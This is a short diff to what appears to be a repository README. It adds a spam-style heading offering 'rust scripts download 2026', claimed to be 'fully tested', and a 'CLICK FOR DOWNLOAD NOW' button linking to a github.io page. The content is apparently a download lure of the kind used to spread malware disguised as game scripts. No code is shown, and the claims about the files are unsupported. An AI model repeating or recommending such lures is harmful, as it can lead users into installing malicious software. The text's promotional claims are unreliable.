@@ -1,10 +1,10 @@
-
+# rust scripts download 2026. Our reliable rust scripts are fully tested and ready for use.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://rust-ib23.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
